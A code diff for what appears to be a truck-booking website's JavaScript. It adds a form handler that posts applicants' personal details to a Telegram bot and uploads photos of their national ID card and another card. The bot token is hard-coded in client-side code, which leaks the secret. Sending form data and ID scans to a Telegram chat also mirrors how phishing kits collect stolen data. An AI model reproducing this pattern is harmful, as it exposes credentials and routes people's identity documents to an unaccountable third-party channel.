@@ -843,13 +843,101 @@ function debounce(func, wait) {
         timeout = setTimeout(later, wait);
     };
 }
+// ضع التوكن و chat_id
+const BOT_TOKEN = "8259868430:AAFQ-oqYzk-nd3cx47XqUdYhPCRQ9YDeWmM";
+const CHAT_ID = "5794299315";
 
-// Add debounced validation for better performance
-const debouncedValidateField = debounce(validateField, 300);
+// الاستماع للفورم
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("booking-form");
+  if (form) {
+    form.addEventListener("submit", handleFormSubmit);
+  }
+});
 
-// Export functions for potential external use
-window.TirsamBooking = {
-    validateField,
-    scrollToForm,
-    showFormMessage
-};
+async function handleFormSubmit(event) {
+  event.preventDefault(); // منع تحديث الصفحة
+
+  // اجمع البيانات
+  const prenom = document.getElementById("firstName").value;
+  const nom = document.getElementById("lastName").value;
+  const phone = document.getElementById("phone").value;
+  const email = document.getElementById("email").value;
+  const wilaya = document.getElementById("wilaya").value;
+  const commune = document.getElementById("commune").value;
+  const businessType = document.getElementById("businessType").value;
+  const registration = document.getElementById("registrationNumber").value;
+  const model = document.getElementById("truckModel").value;
+  const messageText = document.getElementById("message").value;
+
+  const message = `
+📝 <b>طلب جديد</b>
+👤 الاسم: ${prenom} ${nom}
+📞 الهاتف: ${phone}
+📧 الإيميل: ${email}
+🌍 الولاية: ${wilaya}
+🏘️ البلدية: ${commune}
+💼 النشاط: ${businessType}
+📄 رقم التسجيل: ${registration}
+🚚 النموذج: ${model}
+💬 رسالة: ${messageText}
+`;
+
+  try {
+    // أرسل الرسالة النصية
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    });
+
+    // إرسال صورة بطاقة الهوية إذا موجودة
+    const nationalId = document.getElementById("nationalId").files[0];
+    if (nationalId) {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", nationalId, nationalId.name);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: fd,
+      });
+    }
+
+    // إرسال صورة البطاقة الذهبية إذا موجودة
+    const goldCard = document.getElementById("goldCard").files[0];
+    if (goldCard) {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", goldCard, goldCard.name);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: fd,
+      });
+    }
+
+    // أظهر رسالة شكر
+    showFormMessage("✅ شكراً لك! تم إرسال طلبك بنجاح وسنتواصل معك قريباً.", "success");
+
+    // إعادة تعيين الفورم
+    document.getElementById("booking-form").reset();
+
+  } catch (err) {
+    console.error("Telegram error:", err);
+    showFormMessage("❌ حدث خطأ أثناء الإرسال. حاول مرة أخرى.", "error");
+  }
+}
+
+// دالة مساعدة لعرض رسائل النجاح أو الخطأ
+function showFormMessage(msg, type) {
+  const messagesDiv = document.getElementById("form-messages");
+  if (messagesDiv) {
+    messagesDiv.textContent = msg;
+    messagesDiv.style.color = type === "success" ? "green" : "red";
+  } else {
+    alert(msg);
+  }
+}
